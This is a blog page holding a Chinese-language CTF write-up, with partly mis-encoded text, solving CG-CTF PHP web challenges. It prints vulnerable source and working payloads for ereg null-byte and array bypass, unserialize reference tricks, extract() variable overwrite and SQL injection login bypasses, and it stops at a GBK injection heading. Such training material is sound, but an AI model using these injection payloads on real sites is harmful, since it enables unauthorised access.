<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='cgctfä¸å¾—ä¸è¯´æ˜¯ä¸€ä¸ªå¾ˆæ£’çš„å­¦ä¹ å¹³å°ï¼Œè¿™é‡Œæœ‰æˆ‘å†™çš„éƒ¨åˆ†wpï¼š
\0x00 è€ƒç‚¹ï¼š%00æˆªæ–­ï¼ˆeregå‡½æ•°çš„æˆªæ–­æ¼æ´ï¼‰ã€æ•°ç»„ç»•è¿‡ï¼ˆeregå‡½æ•°çš„å¦ä¸€ä¸ªæ¼æ´ï¼‰
é¢˜ç›®ç›´æ¥ç»™æºç ï¼š
view-source:if (isset ($_GET[&#39;nctf&#39;])) {if (@ereg (&amp;quot;^[1-9]&#43;$&amp;quot;, $_GET[&#39;nctf&#39;]) === FALSE)echo &#39;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#39;;else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) die(&#39;Flag: &#39;.$flag);elseecho &#39;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#39;;} è¿™é‡Œeregæœ‰ä¸¤ä¸ªæ¼æ´ï¼š  â‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸ
â‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE
æ³•ä¸€ï¼šæ•°ç»„ç»•è¿‡index.php?nctf[]=#biubiubiuæ³•äºŒï¼š\x00æˆªæ–­index.php?nctf=1%00%23biubiubiunctf{use_00_to_jieduan}
php ååºåˆ—åŒ–(æš‚æ—¶æ— æ³•åš) è€ƒç‚¹ï¼šå¯¹è±¡åŒ…å«çš„å¼•ç”¨åœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¢«å­˜å‚¨
é¢˜ç›®æºç ï¼š
&amp;lt;?phpclass just4fun {var $enter;var $secret;}if (isset($_GET[&#39;pass&#39;])) {$pass = $_GET[&#39;pass&#39;];if(get_magic_quotes_gpc()){$pass=stripslashes($pass);}$o = unserialize($pass);if ($o) {$o-&amp;gt;secret = &amp;quot;*&amp;quot;;if ($o-&amp;gt;secret === $o-&amp;gt;enter)echo &amp;quot;Congratulation!'><title>CG-CTF_wp</title>

<link rel='canonical' href='https://anthem-whisper.github.io/p/cg-ctf_wp/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='CG-CTF_wp'>
<meta property='og:description' content='cgctfä¸å¾—ä¸è¯´æ˜¯ä¸€ä¸ªå¾ˆæ£’çš„å­¦ä¹ å¹³å°ï¼Œè¿™é‡Œæœ‰æˆ‘å†™çš„éƒ¨åˆ†wpï¼š
\0x00 è€ƒç‚¹ï¼š%00æˆªæ–­ï¼ˆeregå‡½æ•°çš„æˆªæ–­æ¼æ´ï¼‰ã€æ•°ç»„ç»•è¿‡ï¼ˆeregå‡½æ•°çš„å¦ä¸€ä¸ªæ¼æ´ï¼‰
é¢˜ç›®ç›´æ¥ç»™æºç ï¼š
view-source:if (isset ($_GET[&#39;nctf&#39;])) {if (@ereg (&amp;quot;^[1-9]&#43;$&amp;quot;, $_GET[&#39;nctf&#39;]) === FALSE)echo &#39;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#39;;else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) die(&#39;Flag: &#39;.$flag);elseecho &#39;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#39;;} è¿™é‡Œeregæœ‰ä¸¤ä¸ªæ¼æ´ï¼š  â‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸ
â‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE
æ³•ä¸€ï¼šæ•°ç»„ç»•è¿‡index.php?nctf[]=#biubiubiuæ³•äºŒï¼š\x00æˆªæ–­index.php?nctf=1%00%23biubiubiunctf{use_00_to_jieduan}
php ååºåˆ—åŒ–(æš‚æ—¶æ— æ³•åš) è€ƒç‚¹ï¼šå¯¹è±¡åŒ…å«çš„å¼•ç”¨åœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¢«å­˜å‚¨
é¢˜ç›®æºç ï¼š
&amp;lt;?phpclass just4fun {var $enter;var $secret;}if (isset($_GET[&#39;pass&#39;])) {$pass = $_GET[&#39;pass&#39;];if(get_magic_quotes_gpc()){$pass=stripslashes($pass);}$o = unserialize($pass);if ($o) {$o-&amp;gt;secret = &amp;quot;*&amp;quot;;if ($o-&amp;gt;secret === $o-&amp;gt;enter)echo &amp;quot;Congratulation!'>
<meta property='og:url' content='https://anthem-whisper.github.io/p/cg-ctf_wp/'>
<meta property='og:site_name' content='wh1sper'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='PHPç‰¹æ€§' /><meta property='article:published_time' content='2020-02-02T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-02-02T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="CG-CTF_wp">
<meta name="twitter:description" content="cgctfä¸å¾—ä¸è¯´æ˜¯ä¸€ä¸ªå¾ˆæ£’çš„å­¦ä¹ å¹³å°ï¼Œè¿™é‡Œæœ‰æˆ‘å†™çš„éƒ¨åˆ†wpï¼š
\0x00 è€ƒç‚¹ï¼š%00æˆªæ–­ï¼ˆeregå‡½æ•°çš„æˆªæ–­æ¼æ´ï¼‰ã€æ•°ç»„ç»•è¿‡ï¼ˆeregå‡½æ•°çš„å¦ä¸€ä¸ªæ¼æ´ï¼‰
é¢˜ç›®ç›´æ¥ç»™æºç ï¼š
view-source:if (isset ($_GET[&#39;nctf&#39;])) {if (@ereg (&amp;quot;^[1-9]&#43;$&amp;quot;, $_GET[&#39;nctf&#39;]) === FALSE)echo &#39;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#39;;else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) die(&#39;Flag: &#39;.$flag);elseecho &#39;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#39;;} è¿™é‡Œeregæœ‰ä¸¤ä¸ªæ¼æ´ï¼š  â‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸ
â‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE
æ³•ä¸€ï¼šæ•°ç»„ç»•è¿‡index.php?nctf[]=#biubiubiuæ³•äºŒï¼š\x00æˆªæ–­index.php?nctf=1%00%23biubiubiunctf{use_00_to_jieduan}
php ååºåˆ—åŒ–(æš‚æ—¶æ— æ³•åš) è€ƒç‚¹ï¼šå¯¹è±¡åŒ…å«çš„å¼•ç”¨åœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¢«å­˜å‚¨
é¢˜ç›®æºç ï¼š
&amp;lt;?phpclass just4fun {var $enter;var $secret;}if (isset($_GET[&#39;pass&#39;])) {$pass = $_GET[&#39;pass&#39;];if(get_magic_quotes_gpc()){$pass=stripslashes($pass);}$o = unserialize($pass);if ($o) {$o-&amp;gt;secret = &amp;quot;*&amp;quot;;if ($o-&amp;gt;secret === $o-&amp;gt;enter)echo &amp;quot;Congratulation!">
    </head>
    <body class="">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.body.dataset.scheme = 'dark';
        } else {
            document.body.dataset.scheme = 'light';
        }
    })();
</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
            <aside class="sidebar left-sidebar sticky">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header class="site-info">
        
            <figure class="site-avatar">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                

                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
        
        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
        <h2 class="site-description">ä¸“æ³¨Webå®‰å…¨å’Œä»£ç å®¡è®¡</h2>
    </header>

    <ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/about'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        
            <li id="dark-mode-toggle">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <span>æš—è‰²æ¨¡å¼</span>
            </li>
        
    </ol>
</aside>

            <main class="main full-width">
    <div id="article-toolbar">
        <a href="https://anthem-whisper.github.io/" class="back-home">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



            <span>Back</span>
        </a>
    </div>

    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
                CTF writeup
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/p/cg-ctf_wp/">CG-CTF_wp</a>
    </h2>

    <footer class="article-time">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <time class="article-time--published">Feb 02, 2020</time>
    </footer></div>
</header>

    <section class="article-content">
    <p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164539.jpeg" alt=""  /></p>
<p>cgctfä¸å¾—ä¸è¯´æ˜¯ä¸€ä¸ªå¾ˆæ£’çš„å­¦ä¹ å¹³å°ï¼Œè¿™é‡Œæœ‰æˆ‘å†™çš„éƒ¨åˆ†wpï¼š</p>
<h3 id="0x00httpteamxlcsinaappcomweb4f5a14f5e6e3453b78cd73899bad98d53indexphp"><a class="link" href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php"  target="_blank" rel="noopener"
    >\0x00</a></h3>
<p>è€ƒç‚¹ï¼š%00æˆªæ–­ï¼ˆeregå‡½æ•°çš„æˆªæ–­æ¼æ´ï¼‰ã€æ•°ç»„ç»•è¿‡ï¼ˆeregå‡½æ•°çš„å¦ä¸€ä¸ªæ¼æ´ï¼‰</p>
<p>é¢˜ç›®ç›´æ¥ç»™æºç ï¼š</p>
<pre><code>view-source:
    if (isset ($_GET['nctf'])) {
        if (@ereg (&quot;^[1-9]+$&quot;, $_GET['nctf']) === FALSE)
            echo 'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
            die('Flag: '.$flag);
        else
            echo 'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~';
    }
</code></pre><ul>
<li>è¿™é‡Œeregæœ‰ä¸¤ä¸ªæ¼æ´ï¼š</li>
</ul>
<p>â‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸ</p>
<p>â‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE</p>
<pre><code>æ³•ä¸€ï¼šæ•°ç»„ç»•è¿‡
index.php?nctf[]=#biubiubiu
æ³•äºŒï¼š\x00æˆªæ–­
index.php?nctf=1%00%23biubiubiu
</code></pre><p>nctf{use_00_to_jieduan}</p>
<h3 id="php-ååºåˆ—åŒ–æš‚æ—¶æ— æ³•åšhttp4chinaloversinaappcomweb25indexphp"><a class="link" href="http://4.chinalover.sinaapp.com/web25/index.php"  target="_blank" rel="noopener"
    >php ååºåˆ—åŒ–(æš‚æ—¶æ— æ³•åš)</a></h3>
<p>è€ƒç‚¹ï¼šå¯¹è±¡åŒ…å«çš„å¼•ç”¨åœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¢«å­˜å‚¨</p>
<p>é¢˜ç›®æºç ï¼š</p>
<pre><code>&lt;?php
class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];
    
    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }
    
    $o = unserialize($pass);
    
    if ($o) {
        $o-&gt;secret = &quot;*&quot;;
        if ($o-&gt;secret === $o-&gt;enter)
            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;
        else 
            echo &quot;Oh no... You can't fool me&quot;;
    }
    else echo &quot;are you trolling?&quot;;
?&gt;
</code></pre><p>ååºåˆ—åŒ–åï¼Œsecretä¼šè¢«é‡æ–°èµ‹å€¼ä¸ºä¸€ä¸ªæœªçŸ¥çš„å€¼ï¼Œä½†è¦æ±‚enterè·Ÿsecretçš„å€¼ä¸€è‡´æ‰èƒ½æ‹¿åˆ°flagã€‚</p>
<ul>
<li>å¯¹è±¡åŒ…å«çš„å¼•ç”¨åœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¢«å­˜å‚¨</li>
</ul>
<p>ç¼–å†™è„šæœ¬ï¼š</p>
<pre><code>&lt;?php
class just4fun {
    var $enter;
    var $secret;
}

$a= new just4fun;

$a-&gt;enter=&amp;$a-&gt;secret;

echo serialize($a);
?&gt;
</code></pre><p>æ‰§è¡Œå¾—åˆ°ï¼š</p>
<pre><code>O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}
</code></pre><p>GETä¼ å€¼è¿‡å»ï¼š</p>
<pre><code>http://4.chinalover.sinaapp.com/web25/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}
</code></pre><p>å¾—åˆ°ï¼š</p>
<pre><code>Congratulation! Here is my secret: thisisnctfsecret
</code></pre><h3 id="å˜é‡è¦†ç›–httpchinaloversinaappcomweb18"><a class="link" href="http://chinalover.sinaapp.com/web18/"  target="_blank" rel="noopener"
    >å˜é‡è¦†ç›–</a></h3>
<p>è€ƒç‚¹ï¼šå˜é‡è¦†ç›–æ¼æ´</p>
<p>é¢˜ç›®å…³é”®éƒ¨åˆ†æºç ï¼š</p>
<pre><code>&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt;
                        &lt;?php
                        extract($_POST);
                        if ($pass == $thepassword_123) { ?&gt;
                            &lt;div class=&quot;alert alert-success&quot;&gt;
                                &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;
                            &lt;/div&gt;
                        &lt;?php } ?&gt;
&lt;?php } ?&gt;
</code></pre><p>æ•´ç†ä¸ºï¼š</p>
<pre><code>&lt;?php

if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {
                        extract($_POST);
                        if ($pass == $thepassword_123) {
                             echo $theflag;
                        }
}

?&gt;
</code></pre><ul>
<li>å˜é‡è¦†ç›–æ¼æ´å¤§å¤šæ•°ç”±å‡½æ•°ä½¿ç”¨ä¸å½“å¯¼è‡´ï¼Œç»å¸¸å¼•å‘å˜é‡è¦†ç›–æ¼æ´çš„å‡½æ•°æœ‰ï¼šextract(), parse_str() å’Œ import_request_variables()</li>
</ul>
<p><strong>extract()å˜é‡è¦†ç›–</strong></p>
<ul>
<li><em>extract() å‡½æ•°ä»æ•°ç»„ä¸­æŠŠå˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚å¯¹äºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œé”®åç”¨äºå˜é‡åï¼Œé”®å€¼ç”¨äºå˜é‡å€¼ã€‚</em></li>
</ul>
<pre><code>&lt;?php

$auth = '0';
extract($_GET)ï¼›

if($auth==1){
echo &quot;private!&quot;;
}else{
echo &quot;public!&quot;;
}
?&gt;
</code></pre><p>å‡è®¾ç”¨æˆ·æ„é€ ä»¥ä¸‹é“¾æ¥ï¼šhttp://www.a.com/test1.php?auth=1</p>
<p>åˆ™ç«™ç‚¹ä¼šè¾“å‡ºâ€œprivateï¼â€</p>
<p>æ‰€ä»¥playloadæ˜¯ï¼šï¼ˆburp suiteæ•°æ®åŒ…ï¼‰</p>
<pre><code>POST /web18/ HTTP/1.1
Host: chinalover.sinaapp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://chinalover.sinaapp.com
Connection: close
Referer: http://chinalover.sinaapp.com/web18/index.php
Upgrade-Insecure-Requests: 1

pass=1&amp;thepassword_123=1
</code></pre><p>nctf{bian_liang_fu_gai!}</p>
<h3 id="å˜é‡è¦†ç›–2httpchinaloversinaappcomweb24"><a class="link" href="http://chinalover.sinaapp.com/web24/"  target="_blank" rel="noopener"
    >å˜é‡è¦†ç›–2</a></h3>
<p>è€ƒç‚¹ï¼šéå†åˆå§‹åŒ–å˜é‡å¯¼è‡´å˜é‡è¦†ç›–</p>
<p>é¢˜ç›®æºç ï¼š</p>
<pre><code>&lt;!--
foreach($_GET as $key =&gt; $value){  
        $$key = $value;  
}  
if($name == &quot;meizijiu233&quot;){
    echo $flag;
}
--&gt;
</code></pre><p>ï¼ˆè¯¦è§æœ¬ç«™â€œ<a class="link" href="http://wh1sper.com/%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%e6%bc%8f%e6%b4%9e%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0/"  target="_blank" rel="noopener"
    >å˜é‡è¦†ç›–æ¼æ´å­¦ä¹ ç¬”è®°</a>â€ï¼‰</p>
<p>playload:</p>
<pre><code>chinalover.sinaapp.com/web24/?name=meizijiu233
</code></pre><p>nctf{AD3FBD8D5928693CA499347C91570AE6}</p>
<h3 id="sql-injectionhttpchinaloversinaappcomweb15indexphp"><a class="link" href="http://chinalover.sinaapp.com/web15/index.php"  target="_blank" rel="noopener"
    >SQL Injection</a></h3>
<p>çŸ¥è¯†ç‚¹ï¼šPHPä»£ç å®¡è®¡ï¼Œsqlè¯­è¨€åŸºç¡€ï¼Œ\è½¬ä¹‰å•å¼•å·</p>
<p>é¢˜ç›®ï¼š</p>
<pre><code>&lt;!--
#GOAL: login as admin,then get the flag;
error_reporting(0);
require 'db.inc.php';

function clean($str){
	if(get_magic_quotes_gpc()){
		$str=stripslashes($str);
	}
	return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) &lt; 1){
	die('Invalid password!');
}

echo $flag;
--&gt;
Invalid password!
</code></pre><ul>
<li>ä»£ç ä¸­clean()å‡½æ•°å»æ‰è½¬ä¹‰ï¼Œhtmlentities($str, ENT_QUOTES)ä¼šè½¬æ¢å•å¼•å·å’ŒåŒå¼•å·ã€‚è¿™é‡Œæˆ‘ä»¬åªèƒ½é€šè¿‡<strong>å¼•å…¥åæ–œæ </strong>ï¼Œ<strong>è½¬ä¹‰åŸæœ‰çš„å•å¼•å·</strong>ï¼Œæ”¹å˜åŸsqlè¯­å¥çš„é€»è¾‘ï¼Œå¯¼è‡´sqlæ³¨å…¥ã€‚</li>
</ul>
<p>payloadå¦‚ä¸‹ï¼š</p>
<pre><code>?username=\&amp;password= or 1#//è¦urlcodeç¼–ç ä¸€ä¸‹ï¼Œä¸ç„¶#ä¼šè¢«æµè§ˆå™¨å½“ä½œç©ºå­—ç¬¦
</code></pre><p>äºæ˜¯sqlæŸ¥è¯¢è¯­å¥ä¸ºï¼š</p>
<pre><code>SELECT * FROM users WHERE
name='\' AND pass='            //æ­¤æ—¶ï¼Œ\'å·²è¢«è½¬ä¹‰ä¸ºä¸€ä¸ªå­—ç¬¦ï¼Œä¸ä¼šèµ·åˆ°å¼•å·çš„ä½œç”¨
or 1
#'
</code></pre><p>flag:nctf{sql_injection_is_interesting}</p>
<h3 id="sqlæ³¨å…¥2http4chinaloversinaappcomweb6indexphp"><a class="link" href="http://4.chinalover.sinaapp.com/web6/index.php"  target="_blank" rel="noopener"
    >SQLæ³¨å…¥2</a></h3>
<p>è€ƒç‚¹ï¼šunionæŸ¥è¯¢ï¼ŒunionæŸ¥è¯¢çš„æ—¶å€™ï¼Œè¿”å›çš„ç»“æœçš„åˆ—åä¸ªç¬¬ä¸€æ¡æŸ¥è¯¢è¯­å¥æ˜¯ç›¸åŒçš„</p>
<h4 id="sql-union-è¯­æ³•">SQL UNION è¯­æ³•</h4>
<pre><code>SELECT column_name(s) FROM table_name1
UNION
SELECT column_name(s) FROM table_name2
</code></pre><p>å¦‚æœè¦æŸ¥è¯¢é‡å¤çš„å€¼ï¼Œå¯ä»¥ä½¿ç”¨ UNION ALLï¼š</p>
<pre><code>SELECT column_name(s) FROM table_name1
UNION ALL
SELECT column_name(s) FROM table_name2
</code></pre><h4 id="å®ä¾‹">å®ä¾‹</h4>
<p>åˆ—å‡ºæ‰€æœ‰åœ¨ä¸­å›½å’Œç¾å›½çš„ä¸åŒçš„é›‡å‘˜åï¼š</p>
<pre><code>SELECT E_Name FROM Employees_China
UNION
SELECT E_Name FROM Employees_USA
</code></pre><h4 id="ç»“æœ">ç»“æœ</h4>
<table>
<thead>
<tr>
<th>E_Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Zhang, Hua</td>
</tr>
<tr>
<td>Wang, Wei</td>
</tr>
<tr>
<td>Carter, Thomas</td>
</tr>
<tr>
<td>Yang, Ming</td>
</tr>
<tr>
<td>Adams, John</td>
</tr>
<tr>
<td>Bush, George</td>
</tr>
<tr>
<td>Gates, Bill</td>
</tr>
</tbody>
</table>
<p>æ³¨æ„ï¼š</p>
<ul>
<li>unionæŸ¥è¯¢å¿…é¡»å’Œç¬¬ä¸€å¥æŸ¥è¯¢è¯­å¥æŸ¥è¯¢åˆ—æ•°ç›¸åŒï¼Œä¸ç„¶ä¼šå‡ºç°é”™è¯¯ï¼›</li>
<li>unionæŸ¥è¯¢çš„æ—¶å€™ï¼Œè¿”å›çš„ç»“æœçš„åˆ—åä¸ªç¬¬ä¸€æ¡æŸ¥è¯¢è¯­å¥æ˜¯ç›¸åŒçš„</li>
<li>unionç¬¬ä¸€æ¡æŸ¥è¯¢å¤±è´¥åä¼šè¿”å›ç¬¬äºŒæ¡çš„ç»“æœï¼Œä½†æ˜¯åˆ—åè¿˜æ˜¯ç¬¬ä¸€æ¡æŸ¥è¯¢çš„åˆ—å</li>
</ul>
<p>æ­¤é¢˜æ­£æ˜¯ç”¨åˆ°äº†ç¬¬ä¸‰æ¡çŸ¥è¯†ç‚¹ï¼š</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
Secure Web Login II
&lt;/head&gt;
&lt;body&gt;
 
&lt;?php
if($_POST[user] &amp;&amp; $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user='$user'&quot;));
  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) {
      echo &quot;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&quot;;
  }
  else {
    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);
  }
}
?&gt;
 
 
&lt;form method=post action=index.php&gt;
&lt;input type=text name=user value=&quot;Username&quot;&gt;
&lt;input type=password name=pass value=&quot;Password&quot;&gt;
&lt;input type=submit&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt;
&lt;/html&gt;
</code></pre><p>æ„æ€æ˜¯æŸ¥è¯¢åˆ°çš„pwå’Œè¾“å…¥çš„pwï¼ˆç»è¿‡md5åŠ å¯†åï¼‰ç›¸åŒï¼Œåˆ™è¾“å‡ºflagï¼›</p>
<p>playloadï¼š</p>
<pre><code>user=' union select md5(1)#
pw=1
</code></pre><p>æŸ¥è¯¢ç»“æœå…¶å®æ˜¯ï¼š</p>
<table>
<thead>
<tr>
<th>pw</th>
</tr>
</thead>
<tbody>
<tr>
<td>md5ï¼ˆ1ï¼‰</td>
</tr>
</tbody>
</table>
<p>äºæ˜¯è¾“å…¥pw=1å³å¯æ»¡è¶³ï¼›</p>
<p>nctf{union_select_is_wtf}</p>
<h3 id="gbk-injectionhttpchinaloversinaappcomsql-gbkindexphpid1"><a class="link" href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1"  target="_blank" rel="noopener"
    >GBK Injection</a></h3>
<p>çŸ¥è¯†ç‚¹ï¼š</p>
<p>å®½å­—èŠ‚æ³¨å…¥ï¼š</p>
